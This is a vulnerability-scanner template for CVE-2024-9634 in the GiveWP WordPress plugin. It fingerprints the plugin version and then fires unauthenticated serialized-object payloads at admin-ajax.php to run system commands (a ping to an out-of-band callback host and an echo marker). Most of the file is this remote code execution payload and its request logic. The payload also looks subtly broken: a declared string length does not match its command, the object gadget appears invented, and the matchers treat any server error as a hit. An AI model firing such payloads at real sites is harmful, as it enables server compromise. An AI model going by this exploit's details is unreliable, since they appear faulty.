id: CVE-2024-9634

info:
  name: GiveWP Plugin ≤ 3.16.3 - Unauthenticated PHP Object Injection (RCE)
  author: kankburhan
  severity: critical
  description: Detects CVE-2024-9634, an unauthenticated PHP Object Injection vulnerability in GiveWP WordPress plugin versions ≤ 3.16.3, which can lead to Remote Code Execution (RCE).
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-9634
    - https://patchstack.com/database/wordpress/plugin/give/vulnerability/wordpress-givewp-plugin-3-16-3-unauthenticated-php-object-injection-to-remote-code-execution-vulnerability
    - https://www.wordfence.com/blog/2024/06/critical-vulnerability-patched-in-givewp-plugin/
    - https://github.com/kankburhan/pocs/tree/main/CVE-2024-9634
  tags: cve,cve2024,wordpress,givewp,rce,poi
  impact: Successful exploitation allows unauthenticated attackers to execute arbitrary PHP code, potentially leading to full server compromise.

requests:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/give/readme.txt"
    matchers:
      - type: regex
        part: body
        regex:
          - "Stable tag: (3\\.16\\.[0-3]|3\\.1[0-5]\\.\\d+|3\\.[0-9]\\.\\d+|2\\.\\d+\\.\\d+|1\\.\\d+\\.\\d+)"
        condition: or
    extractors:
      - type: regex
        name: version
        part: body
        regex:
          - "Stable tag: ([0-9.]+)"

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=give_process_donation&give_title=O:17:"Give_Donation_Form":1:{s:7:"__call";a:2:{i:0;s:6:"system";i:1;s:25:"ping -c 1 {{interactsh-url}}";}}&give_amount=10&give_form_id=1&give_first=John&give_email=test@example.com
    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - "contains(interactsh_protocol, 'dns')"
        condition: and
      - type: status
        status:
          - 500
      - type: regex
        part: body
        regex:
          - "unserialize\\(\\): Error at offset"
          - "PHP Fatal error"

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=give_process_donation&give_donor_title=O:17:"Give_Donation_Form":1:{s:7:"__call";a:2:{i:0;s:6:"system";i:1;s:25:"ping -c 1 {{interactsh-url}}";}}&give_amount=10&give_form_id=1&give_first=John&give_email=test@example.com
    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - "contains(interactsh_protocol, 'dns')"
        condition: and
      - type: status
        status:
          - 500
      - type: regex
        part: body
        regex:
          - "unserialize\\(\\): Error at offset"
          - "PHP Fatal error"

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=give_process_donation&title=O:17:"Give_Donation_Form":1:{s:7:"__call";a:2:{i:0;s:6:"system";i:1;s:25:"ping -c 1 {{interactsh-url}}";}}&give_amount=10&give_form_id=1&give_first=John&give_email=test@example.com
    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - "contains(interactsh_protocol, 'dns')"
        condition: and
      - type: status
        status:
          - 500
      - type: regex
        part: body
        regex:
          - "unserialize\\(\\): Error at offset"
          - "PHP Fatal error"

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=give_process_donation&give_title=O:17:"Give_Donation_Form":1:{s:7:"__call";a:2:{i:0;s:6:"system";i:1;s:19:"echo 'GIVEWP_TEST';";}}&give_amount=10&give_form_id=1&give_first=John&give_email=test@example.com
    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "GIVEWP_TEST"
      - type: status
        status:
          - 500
      - type: regex
        part: body
        regex:
          - "unserialize\\(\\): Error at offset"
          - "PHP Fatal error"

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=give_process_donation&give_title=O:17:"Give_Donation_Form":0:{}&give_amount=10&give_form_id=1&give_first=John&give_email=test@example.com
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 500
      - type: regex
        part: body
        regex:
          - "unserialize\\(\\): Error at offset"
          - "PHP Fatal error"